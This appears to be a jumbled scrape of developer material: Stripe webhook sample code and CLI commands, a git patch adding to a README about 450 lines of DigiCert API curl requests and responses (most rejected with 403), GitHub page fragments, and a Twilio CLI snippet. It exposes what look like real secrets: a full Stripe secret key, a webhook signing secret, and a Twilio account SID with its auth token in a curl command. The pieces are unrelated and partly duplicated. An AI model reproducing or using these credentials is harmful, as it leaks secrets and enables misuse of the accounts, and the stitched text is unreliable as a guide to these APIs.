    payment_method = event.data.object # contains a stripe.PaymentMethod
    print('PaymentMethod was attached to a Customer!')
  # ... handle other event types
  else:
    print('Unhandled event type {}'.format(event.type))

  return HttpResponse(status=200)
stripe trigger payment_intent.succeeded
Running fixture for: payment_intent
Trigger succeeded! Check dashboard for event details.
Note
https://<your-website>/<your-webhook-endpoint>
# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
stripe.api_key = 'sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq'

endpoint = stripe.WebhookEndpoint.create(
  url='https://example.com/my/webhook/endpoint',
  enabled_events=[
    'payment_intent.payment_failed',
    'payment_intent.succeeded',
  ],
)

// server.js
//
// Use this sample code to handle webhook events in your integration.
//
// 1) Paste this code into a new file (server.js)
//
// 2) Install dependencies
//   npm install stripe
//   npm install express
//
// 3) Run the server on http://localhost:4242
//   node server.js

// The library needs to be configured with your account's secret key.
// Ensure the key is kept out of any version control system you might be using.
const stripe = require('stripe')('sk_test_...');
const express = require('express');
const app = express();

// This is your Stripe CLI webhook secret for testing your endpoint locally.
const endpointSecret = "whsec_dc0d1e55ff9884fa12920805cb72f473b613c1fc28d4465c8615748ec8819d1c";

app.post('/webhook', express.raw({type: 'application/json'}), (request, response) => {
  const sig = request.headers['stripe-signature'];

  let event;

  try {
    event = stripe.webhooks.constructEvent(request.body, sig, endpointSecret);
  } catch (err) {
    response.status(400).send(`Webhook Error: ${err.message}`);
    return;
  }

  // Handle the event
  switch (event.type) {
    case 'payment_intent.succeeded':
      const paymentIntentSucceeded = event.data.object;
      // Then define and call a function to handle the event payment_intent.succeeded
      break;
    // ... handle other event types
    default:
      console.log(`Unhandled event type ${event.type}`);
  }

  // Return a 200 response to acknowledge receipt of the event
  response.send();
});

app.listen(4242, () => console.log('Running on port 4242'));

stripe login

stripe listen --forward-to localhost:4242/webhook

stripe trigger payment_intent.succeeded

git checkout Grateful-Bieszczat/webhook-data-created-online-with-bitbuck-1710404806443

git checkout main

From d0d2612716002cf07590f7a35fbf5b4680a109a1 Mon Sep 17 00:00:00 2001
From: grateful345 <163609752+grateful345@users.noreply.github.com>
Date: Fri, 15 Mar 2024 23:54:34 -0500
Subject: [PATCH] Update README.md
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

Account id degi cert 90171939-7ae7-4884-85d4-9a5ccc670fa6
Account id organizations
979310f6-db24-4c67-bcb9-6926d92cd6ec

User id
fa5e727c-0527-44e0-9004-5fdc347b0b3f

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/organization?account_id=979310f6-db24-4c67-bcb9-6926d92cd6ec' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/organization?account_id=979310f6-db24-4c67-bcb9-6926d92cd6ec
Server response
Code	Details
403
Undocumented
Error: Forbidden

Response body
Download
{
  "errors": [
    {
      "code": "AUTHORIZATION_ERROR",
      "message": "No authentication data provided"
    }
  ]
}
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate
 connection: keep-alive
 content-encoding: gzip
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval';
 content-type: application/json
 date: Sat,16 Mar 2024 04:52:19 GMT
 expires: 0
 pragma: no-cache
 referrer-policy: no-referrer
 strict-transport-security: max-age=15724800
 transfer-encoding: Identity
 vary: Accept-Encoding
 x-cdn: Imperva
 x-content-type-options: nosniff
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/*
 x-envoy-upstream-service-time: 10
 x-frame-options: same-origin
 x-iinfo: 15-83073046-83073052 NNNN CT(36 39 0) RT(1710564738237 37) q(0 0 1 -1) r(2 2) U11
 x-xss-protection: 1; mode=block
Responses
Code	Description	Links
200
Organization list

Media type

Controls Accept header.
Example Value
Schema
[
  {
    "id": "d9674d8f-7ad6-4280-89b5-136c2aded288",
    "name": "DigiCert Inc.",
    "address": "2801 N Thanksgiving Way",
    "address2": "Suite 500",
    "zip_code": 84043,
    "city": "Lehi",
    "state": "Utah",
    "country": "US",
    "phone": "+1 (123) 456-7890",
    "account": {
      "id": "ff94b6dc-d360-4245-9918-0d0cf7ac347a",
      "name": "Example Account"
    },
    "active": true
  }
]

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 1000'
Request URL
https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6

{
  "id": "ad65390a-0380-4522-bab6-f007c447757a",
  "name": "Example account 1",
  "active": true,
  "service_period": {
    "from": "2021-05-26",
    "to": "2022-05-26"
  },
  "friendly_identifier": "7092363",
  "admins": [
    {
      "id": "f7e866c9-768c-4442-adc9-abe2ba4b69d1",
      "name": "Jane Doe",
      "email": "jane.doe@example.com"
    }
  ],
  "sign_in_methods": [
    {
      "signInMethod": "standard",
      "status": "enabled",
      "mfaStatus": "disabled",
      "clientAuthCertLoginEnabled": false
    }
  ],
  "oauth_clients": [],
  "locale": "en_US"
}
No links

GET

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6
Server response
Code Details
403
Undocumented
Error: Forbidden

Response body
Download
{
  "errors": [
    {
      "code": "AUTHORIZATION_ERROR",
      "message": "No authentication data provided"
    }
  ]
}
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate
 connection: keep-alive
 content-encoding: gzip
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval';
 content-type: application/json
 date: Sat,16 Mar 2024 04:40:43 GMT
 expires: 0
 pragma: no-cache
 referrer-policy: no-referrer
 strict-transport-security: max-age=15724800
 transfer-encoding: Identity
 vary: Accept-Encoding
 x-cdn: Imperva
 x-content-type-options: nosniff
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/*
 x-envoy-upstream-service-time: 6
 x-frame-options: same-origin
 x-iinfo: 12-53698010-53698015 NNNY CT(35 38 0) RT(1710564042696 63) q(0 0 0 -1) r(1 1) U11
 x-xss-protection: 1; mode=block

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/account?active=all&name=6309304695' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/account?active=all&name=6309304695
Server response
Code Details
403
Undocumented
Error: Forbidden

Response body
Download
{
  "errors": [
    {
      "code": "AUTHORIZATION_ERROR",
      "message": "No authentication data provided"
    }
  ]
}
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate
 connection: keep-alive
 content-encoding: gzip
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval';
 content-type: application/json
 date: Sat,16 Mar 2024 04:42:23 GMT
 expires: 0
 pragma: no-cache
 referrer-policy: no-referrer
 strict-transport-security: max-age=15724800
 transfer-encoding: Identity
 vary: Accept-Encoding
 x-cdn: Imperva
 x-content-type-options: nosniff
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/*
 x-envoy-upstream-service-time: 6
 x-frame-options: same-origin
 x-iinfo: 7-14411267-14411269 NNNY CT(36 40 0) RT(1710564142411 41) q(0 0 0 -1) r(1 1) U11
 x-xss-protection: 1; mode=block
Responses
Code Description Links
200
List of accounts

Media type

Controls Accept header.
Examples

Example Value
Schema
[
  {
    "id": "50580ac7-60e4-4df2-a834-d12c1ab79afb",
    "name": "Example account 1",
    "active": true,
    "service_period": {
      "from": "2021-05-25",
      "to": "2022-05-25"
    },
    "friendly_identifier": "5258283",
    "admins": [
      {
        "id": "833e4906-fc45-4bd3-841e-40506c0e8ca8",
        "email": "api_service_user_1@example.com"
      },
      {
        "id": "fa8285c7-5e35-4ea8-8cc4-dc95f7dc3cd6",
        "email": "api_service_user_2@example.com"
      },
      {
        "id": "7d78b46a-c635-4bda-8b6d-13802046a963",
        "name": "John Doe",
        "email": "account_user_1@example.com"
      }
    ],
    "sign_in_methods": [
      {
        "signInMethod": "standard",
        "status": "enabled",
        "mfaStatus": "disabled",
        "clientAuthCertLoginEnabled": false
      }
    ],
    "locale": "en_US"
  },
  {
    "id": "be5ffbd2-1a50-4675-912f-2fe015812f87",
    "name": "Example account 2",
    "active": true,
    "service_period": {
      "from": "2021-05-26",
      "to": "2022-05-26"
    },
    "friendly_identifier": "7092363",
    "admins": [],
    "sign_in_methods": [
      {
        "signInMethod": "standard",
        "status": "enabled",
        "mfaStatus": "disabled",
        "clientAuthCertLoginEnabled": false
      }
    ],
    "locale": "en_US"
  }
]

Curl

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/api-access-token?user_id=fa5e727c-0527-44e0-9004-5fdc347b0b3f' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/api-access-token?user_id=fa5e727c-0527-44e0-9004-5fdc347b0b3f
Server response
Code Details
403
Undocumented
Error: Forbidden

Response body
Download
{
  "errors": [
    {
      "code": "AUTHORIZATION_ERROR",
      "message": "No authentication data provided"
    }
  ]
}
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate
 connection: keep-alive
 content-encoding: gzip
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval';
 content-type: application/json
 date: Sat,16 Mar 2024 04:44:01 GMT
 expires: 0
 pragma: no-cache
 referrer-policy: no-referrer
 strict-transport-security: max-age=15724800
 transfer-encoding: Identity
 vary: Accept-Encoding
 x-cdn: Imperva
 x-content-type-options: nosniff
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/*
 x-envoy-upstream-service-time: 5
 x-frame-options: same-origin
 x-iinfo: 15-83048556-83048560 NNNY CT(36 38 0) RT(1710564241016 44) q(0 0 0 -1) r(1 1) U11
 x-xss-protection: 1; mode=block
Responses
Code Description Links
200
Success

Media type

Controls Accept header.
Example Value
Schema
[
  {
    "id": "7b5d83e7-6e5f-4ade-ad48-111c6f3420f7",
    "user_id": "e7ea1214-d688-48ba-aa1b-131fb2867ac5",
    "name": "API token name",
    "end_date": "2022-05-30T23:59:59Z",
    "start_date": "2021-06-25T21:20:06Z",
    "active": true,
    "enabled": true,
    "masked_api_key": "*************9e2a1"
  }
]

Curl

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/locales' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/locales
Server response
Code	Details
200
Response body
Download
[
  {
    "code": "de_DE",
    "language": "Deutsch"
  },
  {
    "code": "en_US",
    "language": "English"
  },
  {
    "code": "es_ES",
    "language": "Español"
  },
  {
    "code": "fr_FR",
    "language": "Français"
  },
  {
    "code": "it_IT",
    "language": "Italiano"
  },
  {
    "code": "ja_JP",
    "language": "日本語"
  },
  {
    "code": "ko_KR",
    "language": "한국어"
  },
  {
    "code": "nl_NL",
    "language": "Nederlands"
  },
  {
    "code": "pt_BR",
    "language": "Português"
  },
  {
    "code": "ru_RU",
    "language": "Русский"
  },
  {
    "code": "zh_CN",
    "language": "简体中文"
  },
  {
    "code": "zh_TW",
    "language": "繁體中文"
  }
]
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate
 connection: keep-alive
 content-encoding: gzip
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval';
 content-type: application/json
 date: Sat,16 Mar 2024 04:50:15 GMT
 expires: 0
 pragma: no-cache
 referrer-policy: no-referrer
 strict-transport-security: max-age=15724800
 transfer-encoding: Identity
 vary: Accept-Encoding
 x-cdn: Imperva
 x-content-type-options: nosniff
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/*
 x-envoy-upstream-service-time: 7
 x-frame-options: same-origin
 x-iinfo: 18-118172517-118172518 NNNN CT(35 39 0) RT(1710564614160 42) q(0 0 0 -1) r(1 1) U2
 x-xss-protection: 1; mode=block
Responses
Code	Description	Links
200
Locales list

Media type

Controls Accept header.
Examples

Example Value
Schema
[
  {
    "code": "de_DE",
    "language": "Deutsch"
  },
  {
    "code": "en_US",
    "language": "English"
  },
  {
    "code": "es_ES",
    "language": "Español"
  },
  {
    "code": "fr_FR",
    "language": "Français"

Signed-off-by: grateful345 <163609752+grateful345@users.noreply.github.com>
---
 README.md | 450 ++++++++++++++++++++++++++++++++++++++++++++++++++++++
 1 file changed, 450 insertions(+)

diff --git a/README.md b/README.md
index ed006df..5d8683a 100644
--- a/README.md
+++ b/README.md
@@ -1,3 +1,453 @@
+
+$ Account id degi cert 90171939-7ae7-4884-85d4-9a5ccc670fa6
+Account id organizations 
+979310f6-db24-4c67-bcb9-6926d92cd6ec
+
+User id 
+fa5e727c-0527-44e0-9004-5fdc347b0b3f
+
+curl -X 'GET' \
+  'https://one.digicert.com/account/api/v1/organization?account_id=979310f6-db24-4c67-bcb9-6926d92cd6ec' \
+  -H 'accept: application/json' \
+  -H 'X-API-Key: 10000'
+Request URL
+https://one.digicert.com/account/api/v1/organization?account_id=979310f6-db24-4c67-bcb9-6926d92cd6ec
+Server response
+Code	Details
+403
+Undocumented
+Error: Forbidden
+
+Response body
+Download
+{
+  "errors": [
+    {
+      "code": "AUTHORIZATION_ERROR",
+      "message": "No authentication data provided"
+    }
+  ]
+}
+Response headers
+ cache-control: no-cache,no-store,max-age=0,must-revalidate 
+ connection: keep-alive 
+ content-encoding: gzip 
+ content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
+ content-type: application/json 
+ date: Sat,16 Mar 2024 04:52:19 GMT 
+ expires: 0 
+ pragma: no-cache 
+ referrer-policy: no-referrer 
+ strict-transport-security: max-age=15724800 
+ transfer-encoding: Identity 
+ vary: Accept-Encoding 
+ x-cdn: Imperva 
+ x-content-type-options: nosniff 
+ x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
+ x-envoy-upstream-service-time: 10 
+ x-frame-options: same-origin 
+ x-iinfo: 15-83073046-83073052 NNNN CT(36 39 0) RT(1710564738237 37) q(0 0 1 -1) r(2 2) U11 
+ x-xss-protection: 1; mode=block 
+Responses
+Code	Description	Links
+200	
+Organization list
+
+Media type
+
+Controls Accept header.
+Example Value
+Schema
+[
+  {
+    "id": "d9674d8f-7ad6-4280-89b5-136c2aded288",
+    "name": "DigiCert Inc.",
+    "address": "2801 N Thanksgiving Way",
+    "address2": "Suite 500",
+    "zip_code": 84043,
+    "city": "Lehi",
+    "state": "Utah",
+    "country": "US",
+    "phone": "+1 (123) 456-7890",
+    "account": {
+      "id": "ff94b6dc-d360-4245-9918-0d0cf7ac347a",
+      "name": "Example Account"
+    },
+    "active": true
+  }
+]
+
+curl -X 'GET' \
+  'https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6' \
+  -H 'accept: application/json' \
+  -H 'X-API-Key: 1000'
+Request URL
+https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6
+
+{
+  "id": "ad65390a-0380-4522-bab6-f007c447757a",
+  "name": "Example account 1",
+  "active": true,
+  "service_period": {
+    "from": "2021-05-26",
+    "to": "2022-05-26"
+  },
+  "friendly_identifier": "7092363",
+  "admins": [
+    {
+      "id": "f7e866c9-768c-4442-adc9-abe2ba4b69d1",
+      "name": "Jane Doe",
+      "email": "jane.doe@example.com"
+    }
+  ],
+  "sign_in_methods": [
+    {
+      "signInMethod": "standard",
+      "status": "enabled",
+      "mfaStatus": "disabled",
+      "clientAuthCertLoginEnabled": false
+    }
+  ],
+  "oauth_clients": [],
+  "locale": "en_US"
+}
+No links
+
+GET
+
+curl -X 'GET' \
+  'https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6' \
+  -H 'accept: application/json' \
+  -H 'X-API-Key: 10000'
+Request URL
+https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6
+Server response
+Code Details
+403
+Undocumented
+Error: Forbidden
+
+Response body
+Download
+{
+  "errors": [
+    {
+      "code": "AUTHORIZATION_ERROR",
+      "message": "No authentication data provided"
+    }
+  ]
+}
+Response headers
+ cache-control: no-cache,no-store,max-age=0,must-revalidate 
+ connection: keep-alive 
+ content-encoding: gzip 
+ content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
+ content-type: application/json 
+ date: Sat,16 Mar 2024 04:40:43 GMT 
+ expires: 0 
+ pragma: no-cache 
+ referrer-policy: no-referrer 
+ strict-transport-security: max-age=15724800 
+ transfer-encoding: Identity 
+ vary: Accept-Encoding 
+ x-cdn: Imperva 
+ x-content-type-options: nosniff 
+ x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
+ x-envoy-upstream-service-time: 6 
+ x-frame-options: same-origin 
+ x-iinfo: 12-53698010-53698015 NNNY CT(35 38 0) RT(1710564042696 63) q(0 0 0 -1) r(1 1) U11 
+ x-xss-protection: 1; mode=block
+
+curl -X 'GET' \
+  'https://one.digicert.com/account/api/v1/account?active=all&name=6309304695' \
+  -H 'accept: application/json' \
+  -H 'X-API-Key: 10000'
+Request URL
+https://one.digicert.com/account/api/v1/account?active=all&name=6309304695
+Server response
+Code Details
+403
+Undocumented
+Error: Forbidden
+
+Response body
+Download
+{
+  "errors": [
+    {
+      "code": "AUTHORIZATION_ERROR",
+      "message": "No authentication data provided"
+    }
+  ]
+}
+Response headers
+ cache-control: no-cache,no-store,max-age=0,must-revalidate 
+ connection: keep-alive 
+ content-encoding: gzip 
+ content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
+ content-type: application/json 
+ date: Sat,16 Mar 2024 04:42:23 GMT 
+ expires: 0 
+ pragma: no-cache 
+ referrer-policy: no-referrer 
+ strict-transport-security: max-age=15724800 
+ transfer-encoding: Identity 
+ vary: Accept-Encoding 
+ x-cdn: Imperva 
+ x-content-type-options: nosniff 
+ x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
+ x-envoy-upstream-service-time: 6 
+ x-frame-options: same-origin 
+ x-iinfo: 7-14411267-14411269 NNNY CT(36 40 0) RT(1710564142411 41) q(0 0 0 -1) r(1 1) U11 
+ x-xss-protection: 1; mode=block 
+Responses
+Code Description Links
+200 
+List of accounts
+
+Media type
+
+Controls Accept header.
+Examples
+
+Example Value
+Schema
+[
+  {
+    "id": "50580ac7-60e4-4df2-a834-d12c1ab79afb",
+    "name": "Example account 1",
+    "active": true,
+    "service_period": {
+      "from": "2021-05-25",
+      "to": "2022-05-25"
+    },
+    "friendly_identifier": "5258283",
+    "admins": [
+      {
+        "id": "833e4906-fc45-4bd3-841e-40506c0e8ca8",
+        "email": "api_service_user_1@example.com"
+      },
+      {
+        "id": "fa8285c7-5e35-4ea8-8cc4-dc95f7dc3cd6",
+        "email": "api_service_user_2@example.com"
+      },
+      {
+        "id": "7d78b46a-c635-4bda-8b6d-13802046a963",
+        "name": "John Doe",
+        "email": "account_user_1@example.com"
+      }
+    ],
+    "sign_in_methods": [
+      {
+        "signInMethod": "standard",
+        "status": "enabled",
+        "mfaStatus": "disabled",
+        "clientAuthCertLoginEnabled": false
+      }
+    ],
+    "locale": "en_US"
+  },
+  {
+    "id": "be5ffbd2-1a50-4675-912f-2fe015812f87",
+    "name": "Example account 2",
+    "active": true,
+    "service_period": {
+      "from": "2021-05-26",
+      "to": "2022-05-26"
+    },
+    "friendly_identifier": "7092363",
+    "admins": [],
+    "sign_in_methods": [
+      {
+        "signInMethod": "standard",
+        "status": "enabled",
+        "mfaStatus": "disabled",
+        "clientAuthCertLoginEnabled": false
+      }
+    ],
+    "locale": "en_US"
+  }
+]
+
+Curl
+
+curl -X 'GET' \
+  'https://one.digicert.com/account/api/v1/api-access-token?user_id=fa5e727c-0527-44e0-9004-5fdc347b0b3f' \
+  -H 'accept: application/json' \
+  -H 'X-API-Key: 10000'
+Request URL
+https://one.digicert.com/account/api/v1/api-access-token?user_id=fa5e727c-0527-44e0-9004-5fdc347b0b3f
+Server response
+Code Details
+403
+Undocumented
+Error: Forbidden
+
+Response body
+Download
+{
+  "errors": [
+    {
+      "code": "AUTHORIZATION_ERROR",
+      "message": "No authentication data provided"
+    }
+  ]
+}
+Response headers
+ cache-control: no-cache,no-store,max-age=0,must-revalidate 
+ connection: keep-alive 
+ content-encoding: gzip 
+ content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
+ content-type: application/json 
+ date: Sat,16 Mar 2024 04:44:01 GMT 
+ expires: 0 
+ pragma: no-cache 
+ referrer-policy: no-referrer 
+ strict-transport-security: max-age=15724800 
+ transfer-encoding: Identity 
+ vary: Accept-Encoding 
+ x-cdn: Imperva 
+ x-content-type-options: nosniff 
+ x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
+ x-envoy-upstream-service-time: 5 
+ x-frame-options: same-origin 
+ x-iinfo: 15-83048556-83048560 NNNY CT(36 38 0) RT(1710564241016 44) q(0 0 0 -1) r(1 1) U11 
+ x-xss-protection: 1; mode=block 
+Responses
+Code Description Links
+200 
+Success
+
+Media type
+
+Controls Accept header.
+Example Value
+Schema
+[
+  {
+    "id": "7b5d83e7-6e5f-4ade-ad48-111c6f3420f7",
+    "user_id": "e7ea1214-d688-48ba-aa1b-131fb2867ac5",
+    "name": "API token name",
+    "end_date": "2022-05-30T23:59:59Z",
+    "start_date": "2021-06-25T21:20:06Z",
+    "active": true,
+    "enabled": true,
+    "masked_api_key": "*************9e2a1"
+  }
+]
+
+Curl
+
+curl -X 'GET' \
+  'https://one.digicert.com/account/api/v1/locales' \
+  -H 'accept: application/json' \
+  -H 'X-API-Key: 10000'
+Request URL
+https://one.digicert.com/account/api/v1/locales
+Server response
+Code	Details
+200	
+Response body
+Download
+[
+  {
+    "code": "de_DE",
+    "language": "Deutsch"
+  },
+  {
+    "code": "en_US",
+    "language": "English"
+  },
+  {
+    "code": "es_ES",
+    "language": "Español"
+  },
+  {
+    "code": "fr_FR",
+    "language": "Français"
+  },
+  {
+    "code": "it_IT",
+    "language": "Italiano"
+  },
+  {
+    "code": "ja_JP",
+    "language": "日本語"
+  },
+  {
+    "code": "ko_KR",
+    "language": "한국어"
+  },
+  {
+    "code": "nl_NL",
+    "language": "Nederlands"
+  },
+  {
+    "code": "pt_BR",
+    "language": "Português"
+  },
+  {
+    "code": "ru_RU",
+    "language": "Русский"
+  },
+  {
+    "code": "zh_CN",
+    "language": "简体中文"
+  },
+  {
+    "code": "zh_TW",
+    "language": "繁體中文"
+  }
+]
+Response headers
+ cache-control: no-cache,no-store,max-age=0,must-revalidate 
+ connection: keep-alive 
+ content-encoding: gzip 
+ content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
+ content-type: application/json 
+ date: Sat,16 Mar 2024 04:50:15 GMT 
+ expires: 0 
+ pragma: no-cache 
+ referrer-policy: no-referrer 
+ strict-transport-security: max-age=15724800 
+ transfer-encoding: Identity 
+ vary: Accept-Encoding 
+ x-cdn: Imperva 
+ x-content-type-options: nosniff 
+ x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
+ x-envoy-upstream-service-time: 7 
+ x-frame-options: same-origin 
+ x-iinfo: 18-118172517-118172518 NNNN CT(35 39 0) RT(1710564614160 42) q(0 0 0 -1) r(1 1) U2 
+ x-xss-protection: 1; mode=block 
+Responses
+Code	Description	Links
+200	
+Locales list
+
+Media type
+
+Controls Accept header.
+Examples
+
+Example Value
+Schema
+[
+  {
+    "code": "de_DE",
+    "language": "Deutsch"
+  },
+  {
+    "code": "en_US",
+    "language": "English"
+  },
+  {
+    "code": "es_ES",
+    "language": "Español"
+  },
+  {
+    "code": "fr_FR",
+    "language": "Français"
+
 Host github.com-repo-0
         Hostname github.com
         IdentityFile=/home/user/.ssh/repo-0_deploy_key

6309304695-patch-209 had recent pushes 25 minutes ago
6309304695-patch-210 had recent pushes 24 minutes ago
This branch is 1282 commits ahead of scpwiki/sigma:main.
Folders and files
Name	
Latest commit
6309304695
6309304695
17 minutes ago
History

.devcontainer
5 days ago

.github
3 weeks ago

fonts
last year

images
2 weeks ago

.editorconfig
last week

.gitignore
5 days ago

.prettierrc.toml
last week

.stylelintrc.yaml
10 months ago

LICENSE.md
last week

ReadMe.md
17 minutes ago
Repository files navigation

README

License
image

https://accounts.twilio.com/v1

curl -G https://accounts.twilio.com/v1/Credentials/PublicKeys
-u '[AC32c8d23aa9b687b5ac871ee3e016f518]:[4fb36b6ca3adcce02c96307d8feb6131]' You docker run -it --rm twilio/twilio-cli bash Once the container has finished downloading, and you have entered the shell, you can issue commands using the CLI. For example:

$ docker run -it --rm twilio/twilio-cli bash

root@1234:/twilio# twilio profiles:list ID Account SID Active you AC32c8d23aa9b687b5ac871ee3e016f518 true main AC32c8d23aa9b687b5ac871ee3e016f518 false Run commands directly

